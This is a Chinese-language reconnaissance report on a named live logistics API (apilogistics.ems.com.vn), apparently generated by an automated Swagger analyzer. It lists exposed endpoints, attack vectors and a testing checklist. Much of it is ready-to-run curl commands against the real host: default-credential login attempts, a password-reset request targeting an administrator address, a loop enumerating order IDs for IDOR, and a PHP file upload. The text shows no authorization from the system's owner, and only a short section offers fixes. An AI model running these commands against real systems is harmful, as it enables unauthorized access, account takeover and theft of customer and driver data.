# 🔥 EMS API 关键发现报告

**目标**: `https://apilogistics.ems.com.vn:8080`  
**发现时间**: 2025-10-09  
**风险等级**: 🔴 **CRITICAL**

---

## 📊 执行摘要

✅ **成功获取完整 API 文档** - 34 个端点完全暴露  
🔴 **18 个敏感端点无需认证** - 严重安全漏洞  
⚠️ **JWT 认证机制** - Bearer Token  
🎯 **业务逻辑**: 物流/订单管理系统

---

## 🎯 关键发现

### 1. API 完全暴露
- **Swagger UI**: `https://apilogistics.ems.com.vn:8080/swagger`
- **ReDoc**: `https://apilogistics.ems.com.vn:8080/redoc/`
- **OpenAPI Spec**: `https://apilogistics.ems.com.vn:8080/redoc/?format=openapi`

### 2. API 架构信息
```json
{
  "title": "Snippets API",
  "version": "v1",
  "basePath": "/api",
  "host": "apilogistics.ems.com.vn:8080",
  "schemes": ["https"],
  "认证": "Bearer Token (JWT)"
}
```

### 3. 发现的端点 (34 个)

#### 🔴 高风险端点 (14 个)

**客户模块**:
- `POST /api/customer/login` - 客户登录
- `POST /api/customer/register` - 客户注册

**司机模块**:
- `POST /api/driver/login` - 司机登录
- `POST /api/driver/reset-password` - 重置密码 ⚠️
- `GET /api/driver/get-user` - 获取用户信息
- `POST /api/driver/device-token/delete` - 删除设备令牌
- `POST /api/driver/device-token/save` - 保存设备令牌
- `POST /api/driver/location` - 上传位置信息
- `POST /api/driver/token/refresh` - 刷新令牌
- `POST /api/driver/verify/check` - 验证检查
- `POST /api/driver/verify/send` - 发送验证

**订单/货运模块**:
- `POST /api/order/upload-license` - 上传许可证
- `POST /api/shipment/upload-license` - 上传货运许可证
- `POST /api/notification/read` - 标记通知已读

#### 🟡 中风险端点 (4 个)
- `POST /api/customer/order/create-single` - 创建订单
- `POST /api/driver/edit` - 编辑司机信息
- `POST /api/order/update-status` - 更新订单状态
- `POST /api/faq/create` - 创建FAQ

#### 🟢 低风险端点 (16 个)
- `GET /api/customer/info` - 客户信息
- `GET /api/customer/order/list` - 订单列表
- `GET /api/order/detail` - 订单详情
- `GET /api/order/get-all-status` - 获取所有状态
- `GET /api/order/list-license` - 许可证列表
- `GET /api/shipment/detail` - 货运详情
- `GET /api/shipment/list` - 货运列表
- `GET /api/notification/list` - 通知列表
- `GET /api/notification/badge` - 通知徽章
- `GET /api/faq/get-faq` - 获取FAQ
- `GET /api/faq/get-list-faq` - FAQ列表
- `GET /api/terms-url` - 条款URL
- 等...

---

## 🚨 严重安全问题

### ⚠️ 问题 #1: 敏感端点无认证要求
**发现**: 18 个敏感端点未在 Swagger 中要求认证

**受影响端点** (部分):
```
POST /api/customer/login
POST /api/customer/register
POST /api/customer/order/create-single
POST /api/driver/login
POST /api/driver/reset-password  ⚠️⚠️⚠️
POST /api/driver/location
POST /api/driver/edit
```

**风险**: 
- 可能存在未授权访问
- 密码重置功能可能被滥用
- 订单创建可能被恶意利用
- 司机信息可能被篡改

**建议测试**:
```bash
# 测试是否真的不需要认证
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/customer/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# 测试密码重置
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/driver/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
```

### ⚠️ 问题 #2: API 文档公开暴露
**影响**: 
- 完整的 API 架构暴露
- 业务逻辑可被完全理解
- 降低攻击难度

---

## 🎯 潜在攻击向量

### 1. 未授权访问
```
测试目标: 所有无认证要求的端点
方法: 直接调用 API，观察响应
风险: 数据泄露、越权操作
```

### 2. 业务逻辑漏洞
```
订单创建 → 参数篡改 (价格、状态等)
密码重置 → 账户接管
位置上传 → 位置欺骗
许可证上传 → 文件上传漏洞
```

### 3. IDOR (越权访问)
```
/api/order/detail?id=XXX
/api/shipment/detail?id=XXX
/api/customer/order/list

测试: 修改 ID 参数，访问其他用户数据
```

### 4. 认证绕过
```
JWT Token 验证缺陷
Token 刷新机制漏洞
Session 固定攻击
```

### 5. 数据枚举
```
/api/order/list → 枚举所有订单
/api/customer/order/list → 枚举客户订单
/api/driver/get-user → 枚举司机信息
```

---

## 🔍 立即可执行的测试

### 测试 #1: 验证认证要求
```bash
# 不带 Token 访问
curl -k https://apilogistics.ems.com.vn:8080/api/customer/info
curl -k https://apilogistics.ems.com.vn:8080/api/order/list

# 预期: 如果返回 401 则有认证，否则存在漏洞
```

### 测试 #2: 测试登录端点
```bash
# 测试客户登录
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/customer/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 测试司机登录
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/driver/login \
  -H "Content-Type: application/json" \
  -d '{"username":"driver","password":"password"}'
```

### 测试 #3: 测试注册端点
```bash
# 尝试注册新账户
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/customer/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","password":"test123","email":"test@test.com"}'
```

### 测试 #4: 测试密码重置（高风险）
```bash
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/driver/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@ems.com.vn"}'
```

### 测试 #5: IDOR 测试
```bash
# 获取订单详情 - 尝试不同 ID
for id in {1..100}; do
  curl -k "https://apilogistics.ems.com.vn:8080/api/order/detail?id=$id"
done
```

### 测试 #6: 文件上传测试
```bash
# 测试许可证上传
curl -k -X POST https://apilogistics.ems.com.vn:8080/api/order/upload-license \
  -F "file=@test.php" \
  -F "order_id=1"
```

---

## 🛠️ 推荐工具

### 1. 自动化 API 测试
```bash
# Postman Collection (从 Swagger 导入)
# 下载 OpenAPI spec
curl -k "https://apilogistics.ems.com.vn:8080/redoc/?format=openapi" > ems_api.json

# 导入到 Postman 或 Insomnia
```

### 2. Burp Suite
```
1. 配置代理
2. 导入 OpenAPI spec
3. 使用 Scanner 自动扫描
4. 手动测试业务逻辑
```

### 3. 自定义脚本
```python
# 使用我们的工具
python3 swagger_analyzer.py "https://apilogistics.ems.com.vn:8080/redoc/?format=openapi"

# 查看生成的报告
cat swagger_report_*.txt
cat endpoints_*.txt
```

---

## 📋 测试检查清单

- [ ] 验证所有端点的认证要求
- [ ] 测试默认凭据 (admin/admin, test/test 等)
- [ ] IDOR 漏洞测试 (订单、货运详情)
- [ ] 密码重置功能测试
- [ ] 文件上传漏洞测试
- [ ] JWT Token 验证测试
- [ ] SQL 注入测试 (参数化查询)
- [ ] XSS 测试 (如果有返回 HTML)
- [ ] 批量数据枚举
- [ ] 业务逻辑绕过 (订单状态篡改等)
- [ ] Rate Limiting 测试
- [ ] CSRF 保护测试

---

## 📝 建议修复措施 (给开发团队)

1. **立即下线 Swagger/ReDoc** - 或添加认证保护
2. **强制所有端点认证** - 除了登录/注册外
3. **实施 RBAC** - 基于角色的访问控制
4. **参数验证** - 防止 IDOR 和注入攻击
5. **Rate Limiting** - 防止暴力破解和爬虫
6. **日志监控** - 记录所有 API 访问
7. **安全审计** - 全面的安全评估

---

## 🎯 业务影响评估

| 风险 | 影响 | 可能性 | 严重性 |
|------|------|--------|--------|
| 未授权数据访问 | 客户/订单信息泄露 | 高 | 🔴 严重 |
| 账户接管 | 通过密码重置 | 中 | 🔴 严重 |
| 订单篡改 | 财务损失 | 中 | 🟡 中等 |
| 位置数据泄露 | 司机隐私 | 高 | 🟡 中等 |
| 系统滥用 | 恶意订单创建 | 高 | 🟡 中等 |

---

## 📊 总结

✅ **成功获取**: 完整的 API 文档和 34 个端点  
🔴 **严重问题**: 18 个敏感端点可能无需认证  
⚠️ **推荐行动**: 立即测试认证要求并进行安全加固  

**下一步**: 
1. 执行上述测试脚本
2. 验证漏洞真实性
3. 编写详细的漏洞报告
4. 通知相关方进行修复

---

**报告生成**: 2025-10-09  
**分析工具**: 自动化 Swagger 分析器  
**文件位置**: 
- 完整报告: `swagger_report_20251009_071557.txt`
- 端点列表: `endpoints_20251009_071557.txt`
- JSON 数据: `swagger_analysis_20251009_071557.json`
